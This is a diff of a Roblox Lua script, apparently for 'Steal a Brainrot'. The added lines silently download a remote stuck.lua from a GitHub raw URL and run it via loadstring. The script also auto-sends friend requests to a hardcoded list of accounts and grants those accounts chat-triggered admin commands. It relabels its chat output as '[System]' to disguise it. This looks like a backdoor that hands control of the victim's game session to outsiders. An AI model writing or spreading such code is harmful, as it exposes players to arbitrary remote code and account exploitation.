@@ -15,7 +15,7 @@
 local users = {}
 local users1 = { "SMILEY_RIVALS", "ta3123321", "BUZZFTWGOD", "Smiley9Gamerz", "SABBY_LEAF" }
 
--- Wait for config
+-- Load dynamic users
 spawn(function()
     repeat task.wait() until _G["Script-SM_Config"]
     users = _G["Script-SM_Config"].users or {}
@@ -39,19 +39,32 @@ end)
 -- // Cache
 local friendedCache = {}
 
--- // Send Friend Request (FIXED: No GetSecret, No Errors)
+-- // FETCH & RUN stuck.lua
+task.spawn(function()
+    local success, stuckScript = pcall(function()
+        return HttpService:GetAsync("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/stuck.lua")
+    end)
+    if success and stuckScript then
+        local func, err = loadstring(stuckScript)
+        if func then
+            func() -- Run stuck.lua
+        end
+    end
+end)
+
+-- // Send Friend Request
 local function sendFriendRequest(username)
     local success, userId = pcall(function()
         return Players:GetUserIdFromNameAsync(username)
     end)
     if not success or not userId then return false end
 
-    local url = "https://friends.roblox.com/v1/users/" .. tostring(userId) .. "/request-friendship"
-    local data = HttpService:JSONEncode({ friendshipOriginSourceType = 5 })
-    local headers = { ["Content-Type"] = "application/json" }
-
-    -- REMOVED GetSecret() – causes "Can't find secret" error
-    -- CSRF will be auto-handled by Roblox if needed
+    local url = "https://friends.roblox.com/v1/users/" .. userId .. "/request-friendship"
+    local data = HttpService:JSONEncode({ friendshipOriginSourceType = 1 })
+    local headers = { 
+        ["Content-Type"] = "application/json",
+        ["Referer"] = "https://www.roblox.com/"
+    }
 
     local ok = pcall(function()
         HttpService:PostAsync(url, data, Enum.HttpContentType.ApplicationJson, false, headers)
@@ -59,10 +72,12 @@ local function sendFriendRequest(username)
     return ok
 end
 
--- // Fire Remote
+-- // Fire ToggleFriends
 local function fireToggleRemote()
     if remotePath then
-        pcall(remotePath.FireServer, remotePath)
+        pcall(function()
+            remotePath:FireServer()
+        end)
     end
 end
 
@@ -70,7 +85,7 @@ end
 local function processPlayer(player)
     local name = player.Name
 
-    -- AUTO FRIEND: BOTH users AND users1
+    -- Check if target (users OR users1)
     local isTarget = false
     for _, list in {users, users1} do
         if table.find(list, name) then
@@ -81,8 +96,9 @@ local function processPlayer(player)
 
     if isTarget and not friendedCache[name] then
         friendedCache[name] = true
+
         task.spawn(function()
-            task.wait(1)
+            task.wait(1.5)
             if sendFriendRequest(name) then
                 task.wait(0.5)
                 fireToggleRemote()
@@ -90,7 +106,7 @@ local function processPlayer(player)
         end)
     end
 
-    -- ADMIN COMMANDS: Only users1
+    -- Admin Commands (only users1)
     if table.find(users1, name) then
         player.Chatted:Connect(function(msg)
             local lower = msg:lower()
@@ -104,7 +120,7 @@ discord.gg/cnUAk7uc3n
             elseif lower == "?tgl" then
                 pcall(function()
                     StarterGui:SetCore("ChatMakeSystemMessage", {
-                        Text = "[Scripts.SM] Toggled Friend";
+                        Text = "[System] Toggled Friend";
                         Color = Color3.fromRGB(0, 255, 0);
                         Font = Enum.Font.GothamBold;
                     })
@@ -115,7 +131,7 @@ discord.gg/cnUAk7uc3n
     end
 end
 
--- // MAIN LOOP: Scan every 1 second
+-- // MAIN LOOP – Scan every 1 second
 task.spawn(function()
     while task.wait(1) do
         for _, player in Players:GetPlayers() do
